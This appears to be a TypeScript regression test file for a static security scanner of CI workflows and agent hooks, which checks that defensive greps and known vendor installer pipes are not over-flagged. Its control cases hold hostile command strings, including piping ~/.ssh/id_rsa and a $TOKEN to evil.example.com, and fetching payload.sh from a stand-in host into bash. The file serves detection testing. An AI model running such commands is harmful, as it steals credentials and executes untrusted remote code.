/**
 * Flywheel regressions for P-108 and P-109 (mega-corpus hunt, hunted on
 * 0.1.5, coordinator triage on 0.1.10, still reproducing on the
 * published 0.1.11: both megacorpus-mc fixtures verdict
 * COMPROMISED-PATTERN).
 *
 * P-108: a defensive grep feeds verdict path (b). Content inside a
 * search pattern is pattern text, not behavior, for BOTH halves of a
 * strong evidence combination: a credential path string used as a
 * search target (the pattern, or a file named as search input) is a
 * reference, not credential access, and a URL inside the pattern is
 * never contacted. Controls: reading a credential file and sending
 * its contents still fires at full strength; a step that greps for a
 * URL and then fetches it still fires on the fetch; a grep whose
 * command also cats a credential file still fires on the cat.
 *
 * P-109: four composition gaps in the P-063 installer pipe
 * calibration. (a) Installer shape recognition: token boundary
 * matching on the URL path basename and segments (cargo-hawk-
 * installer.sh), plus documented installer host evidence (the
 * get./install./sh. installer subdomain convention, the pyenv.run
 * endpoint). (b) A pipe of the repo's OWN script at the immutable
 * commit under test (${GITHUB_SHA} / ${{ github.sha }} of
 * ${GITHUB_REPOSITORY} / ${{ github.repository }}) adds no trust
 * surface beyond the code already running. (c) The installer's own
 * footprint rules (WRITE-OUTSIDE alongside the pipe's NET-FETCH and
 * REMOTE-URL) count as part of the pipe shape in the accompaniment
 * test; an independent severe signal (credential access, env exfil)
 * on the same finding still defeats the calibration. (d) The
 * calibration composes per finding at the verdict layer: an
 * unrelated severe finding stands or falls on its own merits and
 * does not re-arm calibrated pipes, and a pipe into an interpreter
 * that is given its program (-m module, -e or -c program, a script
 * operand) parses stdin as data, not as code (the OpenHands mock LLM
 * health check shape: curl of a loopback endpoint piped to
 * python3 -m json.tool).
 *
 * Fixtures are distilled from the hand-read real estates (see
 * problems.md P-108, P-109 and the corpus megacorpus-mc fixtures).
 * Static scans only: fixture code is never executed.
 */
import { describe, it, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { classifyCommand, computeVerdict, scanHooks } from "../src/core.js";
import type { HookFinding } from "../src/core.js";

function fixture(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "hookcheck-v0112-"));
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}
const dirs: string[] = [];
function fx(files: Record<string, string>): string { const d = fixture(files); dirs.push(d); return d; }
after(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

function finding(over: Partial<HookFinding>): HookFinding {
  return {
    id: "x", file: ".github/workflows/ci.yml", source: "github-workflow", hook: "run",
    command: "", classification: "RISKY", rules: [], evidence: "", ...over,
  } as HookFinding;
}
const PIPE_RULES = ["CURL-PIPE-SH", "NET-FETCH", "REMOTE-URL"];

const GREP_STEP = [
  "status=0",
  "grep -inE 'https?://[^/\\\"]*(pkgs\\.visualstudio\\.com|pkgs\\.dev\\.azure\\.com|packagefeedproxy\\.microsoft\\.io)' .npmrc package-lock.json || status=$?",
  "if [ \"$status\" -eq 0 ]; then",
  "  echo \"::error::Found Microsoft package feed URLs. Use https://registry.npmjs.org/ instead.\"",
  "  exit 1",
  "fi",
].join("\n");

describe("P-108: a defensive grep is a search over data, not credential access or network behavior", () => {
  it("the github/docs package-lock lint step carries no CRED-ACCESS", () => {
    const r = classifyCommand(GREP_STEP);
    assert.ok(!r.rules.includes("CRED-ACCESS"), `rules: ${r.rules.join(",")}`);
  });

  it("the distilled fixture tree verdicts at most REVIEW", () => {
    const dir = fx({
      ".github/workflows/package-lock-lint.yml": `name: Package lock lint\non:\n  pull_request:\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check for package feed URLs\n        run: |\n${GREP_STEP.split("\n").map((l) => `          ${l}`).join("\n")}\n`,
    });
    const r = scanHooks(dir);
    assert.equal(r.verdict, "REVIEW", `verdict ${r.verdict}`);
    assert.ok(!r.findings.some((f) => f.rules.includes("CRED-ACCESS")), "no finding carries CRED-ACCESS");
  });

  it("a literal URL inside the search pattern is not REMOTE-URL, and the searched files are not CRED-ACCESS", () => {
    const r = classifyCommand("grep -E 'https://pkgs.dev.azure.com/feed' .npmrc package-lock.json");
    assert.ok(!r.rules.includes("REMOTE-URL"), `rules: ${r.rules.join(",")}`);
    assert.ok(!r.rules.includes("CRED-ACCESS"), `rules: ${r.rules.join(",")}`);
  });

  it("the -e pattern form is pattern text too", () => {
    const r = classifyCommand("grep -e 'https://feed.example.com/x' .npmrc");
    assert.ok(!r.rules.includes("REMOTE-URL"), `rules: ${r.rules.join(",")}`);
    assert.ok(!r.rules.includes("CRED-ACCESS"), `rules: ${r.rules.join(",")}`);
  });

  it("ripgrep search input is a reference, not credential access", () => {
    const r = classifyCommand("rg -n 'npm_config' .npmrc");
    assert.ok(!r.rules.includes("CRED-ACCESS"), `rules: ${r.rules.join(",")}`);
  });

  it("a pipe quoted inside a search pattern is not a curl pipe", () => {
    const r = classifyCommand("grep -R 'curl https://evil.example.com/x | sh' docs/");
    assert.ok(!r.rules.includes("CURL-PIPE-SH"), `rules: ${r.rules.join(",")}`);
  });

  it("control: reading a credential file and sending its contents fires at full strength", () => {
    const r = classifyCommand("cat ~/.ssh/id_rsa | curl -s https://evil.example.com/collect -d @-");
    assert.ok(r.rules.includes("CRED-ACCESS"), `rules: ${r.rules.join(",")}`);
    assert.ok(r.rules.includes("CRED-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("control: a step that greps for a URL and then fetches it still fires on the fetch", () => {
    const r = classifyCommand("grep -E 'https://feed.example.com' list.txt\ncurl -s https://feed.example.com/x");
    assert.ok(r.rules.includes("NET-FETCH"), `rules: ${r.rules.join(",")}`);
    assert.ok(r.rules.includes("REMOTE-URL"), `rules: ${r.rules.join(",")}`);
  });

  it("control: a grep whose command also cats a credential file still fires CRED-ACCESS", () => {
    const r = classifyCommand("grep -E 'token' config.txt\ncat ~/.ssh/id_rsa");
    assert.ok(r.rules.includes("CRED-ACCESS"), `rules: ${r.rules.join(",")}`);
  });

  it("control: a direct credential file read still fires CRED-ACCESS", () => {
    const r = classifyCommand("cat ~/.aws/credentials");
    assert.ok(r.rules.includes("CRED-ACCESS"), `rules: ${r.rules.join(",")}`);
  });
});

describe("P-109a: installer shape recognition generalizes past exact segments and the first host list", () => {
  it("the hawk installer filename (token boundary in the basename) calibrates", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: 'curl --proto \'=https\' --tlsv1.2 -LsSf "https://github.com/astral-sh/hawk/releases/download/v1/cargo-hawk-installer.sh" | sh' })]);
    assert.equal(v, "REVIEW");
  });

  it("the maestro installer host (get. installer subdomain) calibrates", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: 'curl -fsSL "https://get.maestro.mobile.dev" | bash' })]);
    assert.equal(v, "REVIEW");
  });

  it("the pyenv installer endpoint calibrates", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: "curl https://pyenv.run | bash" })]);
    assert.equal(v, "REVIEW");
  });

  it("the nodesource setup script (setup token with a suffix) calibrates", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: "curl -fsSL https://deb.nodesource.com/setup_lts.x | bash -" })]);
    assert.equal(v, "REVIEW");
  });

  it("control: an uninstall script is not an installer shape", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: "curl -fsSL https://evil.example.net/uninstall.sh | bash" })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("control: a non installer payload on an arbitrary host stays COMPROMISED-PATTERN", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: "curl -fsSL https://evil.example.net/payload.sh | bash" })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("scan: the concentrated vendor installer pipes fixture verdicts REVIEW with every pipe kept RISKY", () => {
    const steps = [
      "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --profile=minimal",
      "curl -LsSf https://astral.sh/uv/install.sh | sh",
      'curl --proto \'=https\' --tlsv1.2 -LsSf "https://github.com/astral-sh/hawk/releases/download/${HAWK_VERSION}/cargo-hawk-installer.sh" | sh',
      "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash",
      "curl https://pyenv.run | bash",
      "curl -fsSL https://opencode.ai/install | bash -s -- --version 1.18.30",
      'curl -fsSL "https://get.maestro.mobile.dev" | bash',
      'curl -fsSL https://github.com/${GITHUB_REPOSITORY}/raw/${GITHUB_SHA}/tools/actions/create-release-proposal.sh | sh -s -- "${RELEASE_DATE}"',
    ];
    const dir = fx({
      ".github/workflows/installers.yml": `name: Vendor installer pipes\non:\n  workflow_dispatch:\njobs:\n  installers:\n    runs-on: ubuntu-latest\n    steps:\n${steps.map((s) => `      - run: |\n          ${s}\n`).join("")}`,
    });
    const r = scanHooks(dir);
    assert.equal(r.verdict, "REVIEW", `verdict ${r.verdict}`);
    assert.equal(r.findings.length, 8, `total ${r.findings.length}`);
    assert.ok(r.findings.every((f) => f.rules.includes("CURL-PIPE-SH")), "every pipe is kept as a CURL-PIPE-SH finding");
  });
});

describe("P-109b: the repo's own script at the immutable commit under test is not a remote download", () => {
  it("the nodejs/node start-ci shape calibrates (shell variable spelling)", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: 'curl -fsSL "https://github.com/${GITHUB_REPOSITORY}/raw/${GITHUB_SHA}/tools/actions/start-ci.sh" | sh -s -- "1"' })]);
    assert.equal(v, "REVIEW");
  });

  it("the expression spelling calibrates (raw.githubusercontent.com, github.sha)", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: 'curl -fsSL "https://raw.githubusercontent.com/${{ github.repository }}/${{ github.sha }}/tools/x.sh" | sh' })]);
    assert.equal(v, "REVIEW");
  });

  it("control: the same repo at a mutable ref stays COMPROMISED-PATTERN", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: 'curl -fsSL "https://github.com/${GITHUB_REPOSITORY}/raw/main/tools/actions/start-ci.sh" | sh' })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("control: a literal other repo at the SHA variable is not verified same-repo and stays COMPROMISED-PATTERN", () => {
    const v = computeVerdict([finding({ rules: PIPE_RULES, command: 'curl -fsSL "https://github.com/other-org/other/raw/${GITHUB_SHA}/x.sh" | sh' })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("control: an own-SHA pipe on an auto-exec hook surface stays COMPROMISED-PATTERN", () => {
    const v = computeVerdict([finding({ source: "package.json", rules: PIPE_RULES, command: 'curl -fsSL "https://github.com/${GITHUB_REPOSITORY}/raw/${GITHUB_SHA}/tools/x.sh" | sh' })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });
});

describe("P-109c: the installer's own footprint is part of the pipe shape", () => {
  it("the rollup nvm pipe accompanied by WRITE-OUTSIDE calibrates", () => {
    const v = computeVerdict([finding({ rules: [...PIPE_RULES, "WRITE-OUTSIDE"], command: "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash" })]);
    assert.equal(v, "REVIEW");
  });

  it("scan: the rollup step verbatim (nvm pipe, source of the profile, chmod of the built binary) verdicts REVIEW", () => {
    const step = [
      'if [[ -n "${{ matrix.settings.use-nvm }}" ]]; then',
      "  curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash",
      "  source ~/.nvm/nvm.sh",
      "  nvm install --lts",
      "fi",
      'echo "Node: $(node -v)"',
      "chmod +x dist/bin/rollup",
      "dist/bin/rollup --version",
    ].join("\n");
    const dir = fx({
      ".github/workflows/build-and-tests.yml": `name: build\non: [push]\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n${step.split("\n").map((l) => `          ${l}`).join("\n")}\n`,
    });
    const r = scanHooks(dir);
    assert.equal(r.verdict, "REVIEW", `verdict ${r.verdict}`);
    assert.ok(r.findings[0].rules.includes("CURL-PIPE-SH"), `rules: ${r.findings[0].rules.join(",")}`);
    assert.ok(r.findings[0].rules.includes("WRITE-OUTSIDE"), `rules: ${r.findings[0].rules.join(",")}`);
  });

  it("control: an installer pipe accompanied by credential access stays COMPROMISED-PATTERN", () => {
    const v = computeVerdict([finding({ rules: [...PIPE_RULES, "WRITE-OUTSIDE", "CRED-ACCESS"], command: "curl -LsSf https://astral.sh/uv/install.sh | sh" })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("control: an installer pipe accompanied by env exfil stays COMPROMISED-PATTERN", () => {
    const v = computeVerdict([finding({ rules: [...PIPE_RULES, "WRITE-OUTSIDE", "ENV-EXFIL"], command: "curl -LsSf https://astral.sh/uv/install.sh | sh" })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("control: a non installer pipe accompanied by WRITE-OUTSIDE stays COMPROMISED-PATTERN", () => {
    const v = computeVerdict([finding({ rules: [...PIPE_RULES, "WRITE-OUTSIDE"], command: "curl -fsSL https://evil.example.net/payload.sh | bash" })]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });
});

describe("P-109d: the calibration composes per finding at the verdict layer", () => {
  it("calibrated pipes plus an unrelated severe finding: the severe finding stands on its own merits", () => {
    const v = computeVerdict([
      finding({ rules: PIPE_RULES, command: "curl -LsSf https://astral.sh/uv/install.sh | sh" }),
      finding({ file: ".github/workflows/ci.yml", rules: ["REMOTE-URL", "ENV-ACCESS", "ENV-EXFIL"], command: "curl -d $TOKEN https://evil.example.com" }),
    ]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("calibrated pipes plus a DOWNLOAD-EXEC only finding: the pipes are not re-armed", () => {
    const v = computeVerdict([
      finding({ rules: PIPE_RULES, command: "curl -LsSf https://astral.sh/uv/install.sh | sh" }),
      finding({ source: "package.json", file: "package.json", hook: "postinstall", rules: ["REMOTE-URL", "OBFUSCATION", "DOWNLOAD-EXEC"], command: 'node -e "console.log(1)"' }),
    ]);
    assert.equal(v, "REVIEW");
  });

  it("calibrated pipes plus the same pipe on a hook surface: the hook pipe stands on its own merits", () => {
    const v = computeVerdict([
      finding({ rules: PIPE_RULES, command: "curl -LsSf https://astral.sh/uv/install.sh | sh" }),
      finding({ source: "package.json", file: "package.json", rules: PIPE_RULES, command: "curl -LsSf https://astral.sh/uv/install.sh | sh" }),
    ]);
    assert.equal(v, "COMPROMISED-PATTERN");
  });

  it("a pipe into python3 -m json.tool parses stdin as data and does not fire CURL-PIPE-SH", () => {
    const r = classifyCommand('curl -sf http://127.0.0.1:9998/v1/chat/completions -H "Content-Type: application/json" -d \'{"model":"test"}\' | python3 -m json.tool');
    assert.ok(!r.rules.includes("CURL-PIPE-SH"), `rules: ${r.rules.join(",")}`);
  });

  it("scan: the OpenHands mock LLM health check step carries no CURL-PIPE-SH and verdicts at most REVIEW", () => {
    const step = [
      ".mock-llm-venv/bin/python3 tests/e2e/mock-llm/scripts/mock-llm-server.py --port 9998 &",
      "SERVER_PID=$!",
      "for i in $(seq 1 30); do",
      '  if curl -sf http://127.0.0.1:9998/v1/chat/completions -H "Content-Type: application/json" -d \'{"model":"test","messages":[]}\' > /dev/null 2>&1; then',
      "    break",
      "  fi",
      "  sleep 1",
      "done",
      'curl -sf http://127.0.0.1:9998/v1/chat/completions -H "Content-Type: application/json" -d \'{"model":"test","messages":[]}\' | python3 -m json.tool',
      "kill $SERVER_PID",
    ].join("\n");
    const dir = fx({
      ".github/workflows/mock-llm-e2e.yml": `name: e2e\non: [push]\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n${step.split("\n").map((l) => `          ${l}`).join("\n")}\n`,
    });
    const r = scanHooks(dir);
    assert.ok(!r.findings.some((f) => f.rules.includes("CURL-PIPE-SH")), "no CURL-PIPE-SH finding");
    assert.notEqual(r.verdict, "COMPROMISED-PATTERN", `verdict ${r.verdict}`);
  });

  it("control: a pipe into a bare interpreter still fires CURL-PIPE-SH", () => {
    const r = classifyCommand("curl -s https://evil.example.com/x | python3");
    assert.ok(r.rules.includes("CURL-PIPE-SH"), `rules: ${r.rules.join(",")}`);
    const r2 = classifyCommand("curl -s https://evil.example.com/x | sh");
    assert.ok(r2.rules.includes("CURL-PIPE-SH"), `rules: ${r2.rules.join(",")}`);
  });

  it("control: a pipe into an inline program that executes stdin still fires CURL-PIPE-SH", () => {
    const r = classifyCommand('curl -s https://evil.example.com/x | python3 -c "import sys; exec(sys.stdin.read())"');
    assert.ok(r.rules.includes("CURL-PIPE-SH"), `rules: ${r.rules.join(",")}`);
  });

  it("a pipe into node -e running a constant data program does not fire CURL-PIPE-SH (the MC-6 shape, direct form)", () => {
    const r = classifyCommand('curl -s https://marketplace.example.com/api -d \'{}\' | node -e \'let d="";process.stdin.on("data",c=>d+=c);process.stdin.on("end",()=>console.log(JSON.parse(d)))\'');
    assert.ok(!r.rules.includes("CURL-PIPE-SH"), `rules: ${r.rules.join(",")}`);
  });

  it("a decode pipe into a data parser does not fire DECODE-PIPE-SH; a decode pipe into a bare shell still does", () => {
    const r = classifyCommand("echo aGVsbG8= | base64 -d | python3 -m json.tool");
    assert.ok(!r.rules.includes("DECODE-PIPE-SH"), `rules: ${r.rules.join(",")}`);
    const r2 = classifyCommand("echo aGVsbG8= | base64 -d | sh");
    assert.ok(r2.rules.includes("DECODE-PIPE-SH"), `rules: ${r2.rules.join(",")}`);
  });
});

describe("P-108 and P-109 boundary controls (unchanged by this wave)", () => {
  it("a non installer pipe unaccompanied in a workflow stays COMPROMISED-PATTERN", () => {
    const dir = fx({
      ".github/workflows/ci.yml": "name: ci\non: [push]\njobs:\n  ci:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://evil.example.net/payload.sh | bash\n",
    });
    assert.equal(scanHooks(dir).verdict, "COMPROMISED-PATTERN");
  });

  it("an installer pipe on a hook surface stays COMPROMISED-PATTERN (the calibration is CI only)", () => {
    const dir = fx({
      ".claude/settings.json": JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "curl -LsSf https://astral.sh/uv/install.sh | sh" }] }] } }),
    });
    assert.equal(scanHooks(dir).verdict, "COMPROMISED-PATTERN");
  });

  it("env inheritance into a subprocess with loopback only destinations stays REVIEW with no ENV-EXFIL (P-091 holds)", () => {
    const dir = fx({
      ".github/workflows/windows.yml": "name: t\non: [push]\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: python scripts/serve.py\n",
      "scripts/serve.py": "import os, subprocess, urllib.request\nENV = {**os.environ, 'X': '1'}\nsubprocess.run(['xod', 'serve'], env=ENV)\nurllib.request.urlopen('http://127.0.0.1:8000/health')\n",
    });
    const r = scanHooks(dir);
    assert.equal(r.verdict, "REVIEW", `verdict ${r.verdict}`);
    assert.ok(!r.findings.some((f) => f.rules.includes("ENV-EXFIL")), "no ENV-EXFIL");
  });
});
